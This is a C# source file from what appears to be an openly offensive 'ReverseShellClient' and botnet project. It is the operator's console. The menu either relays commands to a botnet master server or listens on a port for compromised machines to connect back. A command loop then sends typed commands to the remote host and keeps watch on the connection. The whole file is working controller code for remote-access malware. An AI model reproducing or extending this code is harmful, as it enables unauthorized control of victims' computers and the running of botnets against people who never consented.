using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using AdvancedConsole;
using ClientBotnet;
using ClientCommands;
using Shared;

namespace ReverseShellClient
{
    public class ClientManager
    {
        ClientNetworkManager networkManager { get; }

        ClientCommandsManager commandsManager { get; }

        bool waitingForUserCommandInput { get; set; } = false;


        /// <summary>
        /// Constructor sets default console color Green
        /// </summary>
        public ClientManager()
        {
            networkManager = new ClientNetworkManager();
            commandsManager = new ClientCommandsManager(networkManager);
            ColorTools.SetDefaultConsoleColor();
        }


        /// <summary>
        /// Entry point of the client. Call methods to initiate port listening.
        /// When a remote computer connects to us, initiate the prompt loop and monitor the connection.
        /// </summary>
        public void Start()
        {
            ConsoleTools.DisplayBanner();

            var choice = "";
            while (choice != "9")
            {
                Console.WriteLine("\n+---------------------------------------------------+");
                Console.Write("Choose one option :\n\n    1 : Issue commands to the botnet's master server\n    2 : Listen on a port\n    9 : Exit\n\nChoice : ");

                // Reset choice here or infinite loop
                choice = "";
                while (choice != "1" && choice != "2" && choice != "9")
                {
                    choice = Console.ReadLine();
                    // Space a bit
                    Console.WriteLine("");

                    int port;

                    switch (choice)
                    {
                        case "1":
                            port = BotnetManager.Process() ?? 0;
                            if (port != 0)
                            {
                                ListenForIncomingConnection(port);
                            }
                            break;

                        case "2":
                            port = ConsoleTools.AskForPortNumber("Please type a port number to listen to");
                            ListenForIncomingConnection(port);
                            break;

                        case "9":
                            // exit
                            break;

                        default:
                            Console.Write("Invalid choice, please type again\n> ");
                            break;
                    }
                }

                waitingForUserCommandInput = false;
            }
        }


        /// <summary>
        /// Call the client network manager ListenAndConnect() method.
        /// When the connection is established, call RunClient() in the current thread and MonitorConnection() in another thread
        /// </summary>
        /// <param name="port">Port number to listen to</param>
        void ListenForIncomingConnection(int port)
        {
            // Listen and start connection
            networkManager.ListenAndConnect(port);

            // Check if the connection is still active in the background
            var connectionMonitoringTask = new Task(MonitorConnection);
            connectionMonitoringTask.Start();

            // Process user input
            RunClient();
        }


        /// <summary>
        /// Check every second if the other end of the connection is still active.
        /// If it's not and the cleanup wasn't already made, cleanup and make the prompt loop exit
        /// </summary>
        void MonitorConnection()
        {
            while (true)
            {
                // The program is waiting for the user to enter a command, but the other end of the connection disconnected
                if (waitingForUserCommandInput && !networkManager.IsConnected())
                {
                    // Call cleanup method from ClientNetworkManager
                    networkManager.Cleanup(processingCommand: false);
                    
                    // Send [ENTER] key to bypass the console.ReadLine()
                    var hWnd = Process.GetCurrentProcess().MainWindowHandle;
                    PostMessage(hWnd, WM_KEYDOWN, VK_RETURN, 0);

                    break;
                }

                // The program executed a method, but the other end of the connection disconnected, this was caught and the cleanup method was called was made
                if (!waitingForUserCommandInput && networkManager.CleanupMade())
                {
                    break;
                }

                // The other of the connection is still connected, wait and try again
                Thread.Sleep(1000);
            }
        }


        /// <summary>
        /// Main loop waiting for user input and processing it. Call commands and communicate with the server.
        /// </summary>
        void RunClient()
        {
            ConsoleTools.DisplayCommandPrompt();

            while (true)
            {
                waitingForUserCommandInput = true;     // Used for the connectionMonitoringTask
                var commandString = CustomConsole.ReadLine();
                waitingForUserCommandInput = false;

                // If the connection was closed, break from the loop
                if (!networkManager.IsConnected())
                {
                    break;
                }


                if (commandString == "clear" || commandString == "cls")
                {
                    // Clear console
                    Console.Clear();
                }
                else if (commandString == "help")
                {
                    // Global help section
                    commandsManager.ShowGlobalHelp();
                }
                else if (commandString != "")
                {
                    var splittedCommand = commandsManager.GetSplittedCommand(commandString);
                    var commandName = splittedCommand[0];

                    var command = (IClientCommand)commandsManager.GetCommandByName(commandName);
                    if (command != null)
                    {
                        var arguments = new List<string>();

                        if (splittedCommand.Count > 1)
                        {
                            arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
                        }


                        if (arguments.Count == 1 && arguments[0] == "help")
                        {
                            // Display command's help
                            commandsManager.ShowCommandHelp(command);

                            ConsoleTools.DisplayCommandPrompt();
                            continue;
                        }


                        if (!commandsManager.CheckCommandSyntax(command, arguments))
                        {
                            ColorTools.WriteCommandError(
                                $"Syntax error, check out the command's help page ({commandName} help)");

                            ConsoleTools.DisplayCommandPrompt();
                            continue;
                        }


                        try
                        {
                            if (!command.isLocal)
                            {
                                // Send the command to the server
                                networkManager.WriteLine(commandString);
                            }

                            command.Process(arguments);
                        }
                        catch (ExitException)
                        {
                            // The client called the 'Exit', 'StopConnection' or 'Terminate' command
                            Cleanup(isCommandProcessing: false);
                            break;
                        }
                        catch (NetworkException)
                        {
                            Cleanup(isCommandProcessing: true);
                            break;
                        }
                        catch (Exception ex)
                        {
                            // Some command didn't catch its exception...
                            ColorTools.WriteCommandError("An exception occured, this command might be broken...\nDetails below :");
                            Console.WriteLine(ex.Message);
                            Console.WriteLine(ex.StackTrace);
                        }
                    }
                    else
                    {
                        ColorTools.WriteError($"'{commandName}' is not a known command");
                    }
                }

                ConsoleTools.DisplayCommandPrompt();
            }
        }


        /// <summary>
        /// Call the clientNetworkManager Cleanup Method to dispose the network stream and listener
        /// </summary>
        /// <param name="isCommandProcessing">Is the program currently processing user input ?</param>
        void Cleanup(bool isCommandProcessing)
        {
            try
            {
                networkManager.Cleanup(isCommandProcessing);
            }
            catch (Exception)
            {
                // Ignored
            }
        }


        #region Simulate user input

        [DllImport("User32.Dll", EntryPoint = "PostMessageA")]
        static extern bool PostMessage(IntPtr hWnd, uint msg, int wParam, int lParam);

        const int VK_RETURN = 0x0D;
        const int WM_KEYDOWN = 0x100;

        #endregion Simulate user input
    }
}
